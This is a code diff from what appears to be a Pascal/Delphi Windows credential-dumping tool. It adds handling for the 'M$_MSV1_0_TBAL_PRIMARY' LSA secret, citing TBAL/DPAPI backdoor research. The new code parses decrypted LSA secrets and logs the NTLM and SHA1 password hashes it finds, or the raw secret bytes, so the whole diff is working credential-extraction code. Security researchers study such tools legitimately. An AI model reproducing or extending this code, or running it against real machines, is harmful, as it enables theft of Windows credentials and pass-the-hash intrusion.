@@ -1689,6 +1689,8 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
         exit;
         end;
      if getsyskey(syskey)=false then begin log('getsyskey NOT OK',1);exit; end;
+     //tbal:https://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/ & https://twitter.com/gentilkiwi/status/1066830690782797824
+     //M$_MSV1_0_TBAL_PRIMARY_{22BE8E5B-58B3-4A87-BA71-41B0ECF3A9EA}
      //
      if dumpsecret(syskey,input,output_,'currval') then
       begin
@@ -1704,6 +1706,16 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
        if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
        if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
        end
+       else if pos('_tbal_',lowercase(input))>0 then
+            begin
+            if ByteToHexaString (@output_ [4],5)='9800000005' then
+            begin
+            log('ntlm:'+ByteToHexaString (@output_ [16],16),1);
+            log('sha1:'+ByteToHexaString (@output_ [48],20),1);
+            end
+            else //if ByteToHexaString (@output_ [4],5)='9800000005' then
+            log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
+            end  //if pos('_tbal_',lowercase(input))>0 then
        else //if lowercase(input)='dpapi_system' then
        begin
        log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
